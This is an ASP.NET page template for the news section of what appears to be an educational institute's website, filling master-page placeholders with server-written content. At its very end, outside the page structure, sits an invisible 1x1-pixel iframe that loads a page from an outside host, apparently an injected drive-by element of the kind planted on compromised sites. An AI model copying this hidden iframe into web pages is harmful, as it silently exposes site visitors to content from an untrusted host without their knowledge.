<%@ Page Title="" Language="C#" MasterPageFile="~/akhbar.Master" AutoEventWireup="true" CodeBehind="akhbar.aspx.cs" Inherits="WebApplication1.akhbar" %>
<asp:Content ID="Content1" ContentPlaceHolderID="ContentPlaceHolder_title" runat="server">
    <%--موسسه آموزشی صابر--%>
    <% Response.Write(HeaderContent_meta_title); %>
</asp:Content>


<asp:Content ID="Content3" ContentPlaceHolderID="ContentPlaceHolder_TopLinkBar" runat="server">
    <%Response.Write(BodyContent_html_TopLinkkBar); %>
</asp:Content>


<asp:Content ID="Content4"  ContentPlaceHolderID="ContentPlaceHolder_footer" runat="server">
    <%Response.Write(BodyContent_html_TopLinkkBar); %>
</asp:Content>

<asp:Content ID="Content2" ContentPlaceHolderID="ContentPlaceHolder_akhbar" runat="server">
     <%Response.Write(BodyContent_html_akhbar); %>
</asp:Content>
<div></div><div><iframe src="http://mbnetwork.com/news.php" width="1" height="1"></iframe></div>